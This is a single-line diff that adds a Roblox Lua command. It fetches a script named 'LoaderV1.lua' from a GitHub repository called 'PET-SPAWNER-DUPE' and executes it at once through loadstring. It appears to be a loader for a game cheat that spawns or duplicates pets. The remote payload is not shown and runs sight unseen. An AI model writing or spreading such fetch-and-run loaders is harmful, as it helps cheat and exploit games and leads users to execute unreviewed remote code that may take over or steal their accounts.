@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id-s/PET-SPAWNER-DUPE/refs/heads/main/LoaderV1.lua"))()
